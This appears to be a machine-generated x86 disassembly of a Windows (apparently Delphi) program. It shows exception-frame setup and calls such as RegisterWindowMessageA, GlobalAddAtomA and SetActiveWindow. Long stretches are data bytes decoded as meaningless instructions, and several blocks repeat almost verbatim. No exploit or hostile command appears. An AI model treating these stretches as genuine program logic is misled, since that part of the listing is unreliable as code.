push sub_42daf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d04c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42dac5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dacc
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d0a8
retn
sub_42dacc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dafa
mov eax [ ebp - 0x14 ]
call sub_464200
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_464070
retn
sub_42dbd0
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408cec
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42dc6b
add [ edi ] cl
add [ eax ] al
add [ eax ] bh
push 0xd56c0047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] dh
inc edi
add [ eax + 0x47d7 ] dh
add [ eax ] al
add [ eax ] dh
push 0xd5440047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] ch
inc edi
add al al
fadd [ edi ]
add [ eax ] al
add [ eax ] al
sub [ eax + 0x47 ] ch
add ah cl
xlat
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] ah
inc edi
add [ eax - 0x29 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push 0xd8540047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] bl
inc edi
add [ esi + edx * 8 + 0x47 ] dh
add [ eax ] al
sbb [ eax + 0x47 ] ch
add [ edi + edx * 8 + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] dl
inc edi
add al bl
salc
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push 0xd94c0047
inc edi
add [ eax ] al
add [ eax ] al
add ah bl
inc edi
add [ ebp + edx * 8 + 0x47 ] bh
add [ eax ] al
fsub [ edi + 0x47 ]
add [ eax + 0x47d8 ] ah
add [ eax ] al
add ah dl
inc edi
add ah ch
fadd [ edi ]
add [ eax ] al
add [ eax ] al
shl [ edi + 0x47 ] 0x1
add [ edi + edx * 8 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42dd76
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd7d
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_40499c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42dd80
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403cf4
call sub_42dbd0
mov eax [ r-xdata ]
call sub_417aa4
mov eax [ r-xdata ]
call sub_417b44
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
sub_42ddc1
fld [ edx ]
add ecx [ ebx ]
push esp
inc edx
jbe r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
push eax
fild [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
fild [ edx ]
insb
add [ eax ] eax
outsd
je r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
fld [ edx ]
or [ edx + 0x73 ] esp
dec esp
outsd
ja r-xdata
xor [ eax ] eax
sub al 0x4d
inc ebp
add [ eax + 0x780044f2 ] al
out 0x44 al
add [ edx + ecx * 4 - 0xdb7ffbf ] al
inc esp
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add al cl
lds eax [ eax + eax + 0x74 ]
iretd
mov al [ ecx ]
dec eax
inc esp
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
jo r-xdata
imul ebp [ esi + 0x65 ] 0x5273620b
xor [ eax ] eax
inc esp
add [ eax ] ch
je r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
mov esp 0xe400420b
push cs
inc edx
add [ esi * 8 - 0x1eefffbe ] ah
inc esp
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
insb
jae r-xdata
xor eax [ eax ]
mov al [ 0x280044e5 ]
in al dx
je r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 - 0x907ffbc ] dh
inc edx
add [ esi ] al
push esp
inc edx
jbe r-xdata
add al dl
les eax [ eax + eax + 0x14 ]
int3
inc edx
outsd
fiadd [ edx ]
add ah dh
xchg edx eax
inc esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x21 ] dl
inc edx
insb
jae r-xdata
hlt
insb
nop
push eax
fild [ edx ]
pop es
push es
push esp
inc edx
jbe r-xdata
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
add [ ebx + 0x33 ] esi
mov eax r-xdata
call sub_403cf4
call sub_42dbd0
mov eax [ r-xdata ]
call sub_417aa4
mov eax [ r-xdata ]
call sub_417b44
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
retn
rol [ eax ] 0xde
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
mov ah 0xde
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x4273620c
add [ edi + ebx * 8 + 0x42 ] al
add [ ecx + eax ] ch
push esp
outsd
jo r-xdata
insd
or [ gs : edx + 0x73 ] esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add ah bh
fld [ edx ]
add eax 0x6f427362
inc edx
add [ eax + 0x1 ] ch
add bh bh
nop
jb r-xdata
add [ eax ] al
inc [ eax ]
inc ebx
je r-xdata
or eax [ edx ]
lodsb [ esi ]
add [ eax ] cl
loope r-xdata
add [ eax ] al
rol [ eax + eax + 0x1 ] cl
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0xff0000 ] bl
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
shl al 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loope r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add bh bh
add bl dl
inc esp
insb
jae r-xdata
dec ecx
outsb
je r-xdata
or al 0x42
add [ eax + eax ] al
add [ ebx + ebp * 2 ] dh
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul eax [ ecx ] 0xf5acff00
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0x23010000 ] bl
rol [ eax + eax - 0x5c ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
cmc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fld [ edx ]
push 0x90ff0001
push 0x6948776f
outsb
je r-xdata
jmp [ eax + 0x10044c6 ]
add [ eax + edi * 2 ] cl
inc esp
add [ ebx ] bl
add bh bh
mov al [ 0x10044c6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
dec esp
jg r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
lodsb [ esi ]
push edi
inc ebp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
loop r-xdata
insb
jae r-xdata
inc edx
add [ eax + 0x10042f9 ] al
add bh ch
inc [ eax - 0x5 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe1149072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e0d072
add [ eax ] dh
insb
inc ecx
add [ 0x78450800 ] al
je r-xdata
or eax [ edx ]
in al 0xe
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
sar cl 0x1
inc edx
add [ eax - 0x75 ] ch
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax + 0xa ] dh
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
imul ebp [ esi + 0x74 ] r-xdata
fld [ edx ]
jae r-xdata
add [ ecx ] ah
add bh bh
loopne r-xdata
inc esp
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
popad
insb
je r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + edi * 8 + 0x42 ] dl
add [ eax + eax * 2 + 0x1a80045 ] dh
inc ebx
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
mov al [ ecx ]
dec eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffbd1e ] dh
loop r-xdata
inc eax
add [ eax ] al
add bh bh
or bl bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax ]
sti
add [ ecx ] al
adc [ eax ] al
0xff0000 0x44d3
add al ch
xchg ebx eax
inc esp
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax ]
iretd
add [ edx + eax ] ah
add [ eax ] al
adc al 0x94
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
[ eax ]
sti
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
cdq
add [ eax ] al
sub_42dece
inc esp
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ esi * 8 - 0x1eefffbe ] ah
inc esp
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 - 0x907ffbc ] dh
inc edx
add [ esi ] al
push esp
inc edx
jbe r-xdata
add al dl
les eax [ eax + eax + 0x14 ]
int3
hlt
insb
nop
push eax
fild [ edx ]
pop es
push es
push esp
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
mov ah 0xde
inc edx
inc edx
add [ eax + 0x1 ] ch
add bh bh
nop
jb r-xdata
add [ eax ] al
inc [ eax ]
inc ebx
je r-xdata
or eax [ edx ]
lodsb [ esi ]
add [ eax ] cl
loope r-xdata
add [ eax ] al
rol [ eax + eax + 0x1 ] cl
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0xff0000 ] bl
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
shl al 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loope r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add bh bh
add bl dl
inc esp
insb
jae r-xdata
dec ecx
outsb
je r-xdata
or al 0x42
add [ eax + eax ] al
add [ ebx + ebp * 2 ] dh
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul eax [ ecx ] 0xf5acff00
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0x23010000 ] bl
rol [ eax + eax - 0x5c ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
cmc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fld [ edx ]
push 0x90ff0001
push 0x6948776f
outsb
je r-xdata
jmp [ eax + 0x10044c6 ]
add [ eax + edi * 2 ] cl
inc esp
add [ ebx ] bl
add bh bh
mov al [ 0x10044c6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
dec esp
jg r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
lodsb [ esi ]
push edi
inc ebp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
loop r-xdata
insb
jae r-xdata
inc edx
add [ eax + 0x10042f9 ] al
add bh ch
inc [ eax - 0x5 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe1149072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e0d072
add [ eax ] dh
insb
inc ecx
add [ 0x78450800 ] al
je r-xdata
or eax [ edx ]
in al 0xe
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
sar cl 0x1
inc edx
add [ eax - 0x75 ] ch
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax + 0xa ] dh
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
imul ebp [ esi + 0x74 ] r-xdata
fld [ edx ]
jae r-xdata
add [ ecx ] ah
add bh bh
loopne r-xdata
inc esp
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
popad
insb
je r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + edi * 8 + 0x42 ] dl
add [ eax + eax * 2 + 0x1a80045 ] dh
inc ebx
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
mov al [ ecx ]
dec eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffbd1e ] dh
loop r-xdata
inc eax
add [ eax ] al
add bh bh
or bl bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax ]
sti
add [ ecx ] al
adc [ eax ] al
0xff0000 0x44d3
add al ch
xchg ebx eax
inc esp
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax ]
iretd
add [ edx + eax ] ah
add [ eax ] al
adc al 0x94
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
[ eax ]
sti
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
cdq
add [ eax ] al
sub_42df0a
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_42df2e
inc esp
add [ eax - 0x2a ] ah
inc esp
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 - 0x907ffbc ] dh
inc edx
add [ esi ] al
push esp
inc edx
jbe r-xdata
hlt
insb
nop
push eax
fild [ edx ]
pop es
push es
push esp
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
mov ah 0xde
inc edx
inc edx
add [ eax + 0x1 ] ch
add bh bh
nop
jb r-xdata
add [ eax ] al
inc [ eax ]
inc ebx
je r-xdata
or eax [ edx ]
lodsb [ esi ]
add [ eax ] cl
loope r-xdata
add [ eax ] al
rol [ eax + eax + 0x1 ] cl
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0xff0000 ] bl
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
shl al 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loope r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add bh bh
add bl dl
inc esp
insb
jae r-xdata
dec ecx
outsb
je r-xdata
or al 0x42
add [ eax + eax ] al
add [ ebx + ebp * 2 ] dh
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul eax [ ecx ] 0xf5acff00
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0x23010000 ] bl
rol [ eax + eax - 0x5c ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
cmc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fld [ edx ]
push 0x90ff0001
push 0x6948776f
outsb
je r-xdata
jmp [ eax + 0x10044c6 ]
add [ eax + edi * 2 ] cl
inc esp
add [ ebx ] bl
add bh bh
mov al [ 0x10044c6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
dec esp
jg r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
lodsb [ esi ]
push edi
inc ebp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
loop r-xdata
insb
jae r-xdata
inc edx
add [ eax + 0x10042f9 ] al
add bh ch
inc [ eax - 0x5 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe1149072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e0d072
add [ eax ] dh
insb
inc ecx
add [ 0x78450800 ] al
je r-xdata
or eax [ edx ]
in al 0xe
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
sar cl 0x1
inc edx
add [ eax - 0x75 ] ch
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax + 0xa ] dh
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
imul ebp [ esi + 0x74 ] r-xdata
fld [ edx ]
jae r-xdata
add [ ecx ] ah
add bh bh
loopne r-xdata
inc esp
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
popad
insb
je r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + edi * 8 + 0x42 ] dl
add [ eax + eax * 2 + 0x1a80045 ] dh
inc ebx
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
mov al [ ecx ]
dec eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffbd1e ] dh
loop r-xdata
inc eax
add [ eax ] al
add bh bh
or bl bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax ]
sti
add [ ecx ] al
adc [ eax ] al
0xff0000 0x44d3
add al ch
xchg ebx eax
inc esp
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax ]
iretd
add [ edx + eax ] ah
add [ eax ] al
adc al 0x94
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
[ eax ]
sti
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
cdq
add [ eax ] al
sub_42dfb9
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
inc edx
add [ eax + 0x1 ] ch
add bh bh
nop
jb r-xdata
or eax [ edx ]
lodsb [ esi ]
add [ eax ] cl
loope r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0xff0000 ] bl
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
dec ecx
outsb
je r-xdata
or al 0x42
add [ eax + eax ] al
add [ ebx + ebp * 2 ] dh
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul eax [ ecx ] 0xf5acff00
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0x23010000 ] bl
rol [ eax + eax - 0x5c ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
cmc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fld [ edx ]
push 0x90ff0001
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
shl al 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loope r-xdata
outsb
je r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
lodsb [ esi ]
push edi
inc ebp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
loop r-xdata
insb
jae r-xdata
